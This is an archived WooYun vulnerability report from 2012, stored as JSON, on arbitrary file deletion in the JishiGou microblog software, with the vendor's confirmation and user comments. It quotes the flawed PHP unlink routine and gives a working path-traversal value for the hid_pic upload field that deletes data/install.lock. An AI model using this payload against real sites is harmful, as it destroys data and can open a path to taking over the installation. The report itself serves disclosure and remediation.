{"id": 18098, "wybug_id": "wooyun-2012-09453", "wybug_title": "记事狗任意文件删除", "wybug_corp": "杭州神话", "wybug_author": "yy520", "wybug_date": "2012-07-11 09:42", "wybug_open_date": "2012-08-25 09:43", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2012-09-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-09-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-25：\t细节向公众公开  简要描述： 任意文件删除。为了能拿回rank为了能拿到礼物我再花一个晚上挖漏洞。。。。。。对了，说好的礼物在哪里？？？ 详细说明：  利用条件：1.仅限于windows主机,linux无效（至少我本机就不行）2.已注册用户3.需要删除的文件可读写在modules/ajax/event.mod.php中\n#保护性删除图片\tfunction doUnlink($pic){\t\tif(!$pic) return false;\t\t$type = trim(strtolower(end(explode(\".\",$pic))));\t\t$exp = '././images/event/[0-9]{10}'.MEMBER_ID.'_b.'.$type;\t\tif(ereg($exp,$pic)){\t\t\tunlink($pic);\t\t\tunlink(strtr($pic,'_b.','_s.'));\t\t\treturn true;\t\t}else {\t\t\treturn false;\t\t}\t}\n该函数在 onloadPic中被调用\nif($_FILES['pic']['name']){\t//省略.....................\t $hid_pic = $this->Post['hid_pic'];               $eid = (int) $this->Post['id'];              $this->doUnlink($hid_pic,$eid);\t//省略.............}\n只要$_FILES['pic']['name'] 不为空，然后我们就可以构造hid_pic了hid_pic 的内容为：././images/event/1234567890{MEMBER_ID}_b.{你要删除的文件的后缀}/../../../{你要删除的文件}比如我们要删除./data/install.lock文件，而且我的MEMBER_ID为2 则：././images/event/12345678902_b.lock/../../../data/install.lock本地测试成功实际利用：在 index.php?mod=event&code=pevent上传抓包，然后在hid_pic底下填写././images/event/12345678902_b.lock/../../../data/install.lock 即可   漏洞证明：  .....懒得了   修复方案：  do it yourself   版权声明：转载请注明来源 yy520@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-07-13 17:23 厂商回复： 漏洞已经确认正在修复中，稍后给出修复方案，感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-11 10:09 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  有木有先保存配置文件的洞洞    \n     2012-07-13 17:26 |    \t\t杭州神话(乌云厂商)\t\t \n  @yy520 已经在乌云站内发送了联系方式索取申请给你，请赐予相关联系方式，我们会有工作人员联系你的    \n     2012-07-15 14:17 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  这个影响的版本是多少呢？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}